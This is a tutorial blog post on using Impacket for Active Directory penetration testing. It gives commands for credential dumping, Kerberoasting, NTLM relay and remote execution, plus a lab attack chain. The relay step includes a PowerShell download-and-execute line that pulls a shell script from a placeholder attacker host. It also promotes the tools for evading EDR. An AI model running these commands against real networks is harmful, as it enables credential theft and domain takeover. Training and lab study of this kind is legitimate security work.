---
layout: post
title: "10 Days of AD Security: Day 2 - Impacket"
date: 2026-02-06
category: Active Directory Security
author: James Wells
---

## History and Overview

Impacket is a collection of Python classes that provide low-level programmatic access to network protocols, particularly those used in Windows environments. Created by Core Security Technologies (now Fortra) and maintained since 2015, Impacket has become the foundational toolkit for AD penetration testing from Linux platforms. The library implements dozens of protocols including SMB, MSRPC, NTLM, Kerberos, WMI, and LDAP, allowing security researchers to interact with Windows networks without needing Windows-based tools. What makes Impacket particularly powerful is its collection of example scripts that demonstrate practical attacks: secretsdump.py for credential extraction, GetUserSPNs.py for Kerberoasting, ntlmrelayx.py for relay attacks, and psexec.py for remote code execution. The October 2025 release added support for Windows Server 2025 and included new scripts like badsuccessor.py for delegated Managed Service Account exploitation, demonstrating Impacket's continued evolution.

## Download and Installation

**Official Source:** [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

**Installation:**

```bash
# On Kali Linux (pre-installed, but update to latest)
sudo apt update
sudo apt install python3-impacket

# Or install from source for latest version
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Verify installation
impacket-secretsdump -h
```

**Key Scripts Location:**
- If installed via pip: Scripts are in your PATH as `impacket-[scriptname]`
- If using from source: Scripts are in `impacket/examples/`

## When to Use Impacket

Use Impacket when you need to:
- **Perform AD attacks from Linux**: Essential for Kali Linux-based penetration testing
- **Extract credentials remotely**: DCSync, SAM/LSA secrets dumping without touching disk
- **Execute Kerberoasting attacks**: Offline password cracking of service accounts
- **Relay NTLM authentication**: Intercept and relay authentication to other systems
- **Achieve remote code execution**: psexec, wmiexec, smbexec for lateral movement
- **Interact with AD programmatically**: Build custom tools using Impacket libraries
- **Bypass EDR detection**: Python-based tools often have lower detection rates than Windows binaries

Impacket is used throughout the entire AD attack lifecycle, from initial enumeration to post-exploitation and persistence.

## Walkthrough

**Scenario 1: Credential Dumping with secretsdump.py**

Once you have credentials or a hash, extract all domain credentials:

```bash
# Using credentials
impacket-secretsdump 'domain/username:password@dc-ip'

# Using NTLM hash (Pass-the-Hash)
impacket-secretsdump -hashes :ntlmhash domain/username@dc-ip

# DCSync attack (requires Replication rights)
impacket-secretsdump -just-dc-ntlm domain/username@dc-ip

# Output to file for offline cracking
impacket-secretsdump domain/username:password@dc-ip -outputfile hashes
```

**Scenario 2: Kerberoasting with GetUserSPNs.py**

Request TGS tickets for service accounts and crack offline:

```bash
# Enumerate and request TGS tickets
impacket-GetUserSPNs domain/username:password -dc-ip dc-ip -request

# Save to hashcat format
impacket-GetUserSPNs domain/username:password -dc-ip dc-ip -request -outputfile kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**Scenario 3: NTLM Relay Attack with ntlmrelayx.py**

Relay captured NTLM authentication to target systems:

```bash
# Set up relay to SMB targets
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to LDAP for privilege escalation
impacket-ntlmrelayx -t ldap://dc-ip --escalate-user lowpriv

# Relay to ADCS for certificate request (new in 2025)
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp -smb2support --template User
```

**Scenario 4: Remote Code Execution**

```bash
# psexec.py - Requires local admin
impacket-psexec domain/username:password@target-ip

# wmiexec.py - Stealthier, no service creation
impacket-wmiexec domain/username:password@target-ip

# Using NTLM hash instead of password
impacket-wmiexec -hashes :ntlmhash domain/username@target-ip
```

## Game of Active Directory Lab Example

In the GOAD environment, Impacket is essential for Linux-based attacks:

**Scenario: From Initial Creds to Domain Compromise**

1. **Initial Access**: We've obtained credentials for samwell.tarly (found in description field)

2. **Kerberoasting Attack**:
   ```bash
   # Request TGS for all SPNs
   impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11 -request -outputfile spns.txt

   # This reveals jon.snow has an SPN and is kerberoastable
   # Crack the hash offline
   hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
   ```

3. **Credential Dumping After Privilege Escalation**:
   ```bash
   # Once we have Domain Admin creds (jon.snow), dump everything
   impacket-secretsdump north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.11 -just-dc-ntlm -outputfile goad-hashes

   # This provides NTLM hashes for all domain accounts including:
   # - Administrator
   # - krbtgt (for Golden Ticket attacks)
   # - Other privileged accounts
   ```

4. **Lateral Movement to Other Domains**:
   ```bash
   # Use dumped credentials to pivot to Essos domain
   impacket-wmiexec essos.local/administrator@192.168.56.12 -hashes :ntlmhash
   ```

5. **NTLM Relay for Additional Compromise**:
   ```bash
   # Set up relay targeting GOAD SQL server
   impacket-ntlmrelayx -tf sql-servers.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
   ```

**GOAD-Specific Impacket Use Cases:**
- Enumerate MSSQL instances and execute commands: `impacket-mssqlclient`
- Test credentials across all GOAD systems: Combined with target lists
- Extract backup DPAPI keys for credential decryption
- Perform Pass-the-Hash lateral movement between GOAD domains

## Conclusion

Impacket is the Swiss Army knife of AD penetration testing from Linux platforms. Its comprehensive protocol implementations enable everything from initial reconnaissance to complete domain compromise, all without requiring Windows-based tools. The library's continued development ensures compatibility with modern Windows environments and emerging attack techniques.

For GOAD lab practitioners, Impacket is essential for the majority of attack chains. Its reliability, stealth characteristics, and extensive feature set make it a must-have in any AD pentester's toolkit. The scripts are well-documented, widely supported by the community, and integrate seamlessly with other tools in the offensive security ecosystem.

**Next in this series:** Day 3 will cover Rubeus, the premier C# toolkit for Kerberos abuse and ticket manipulation attacks.
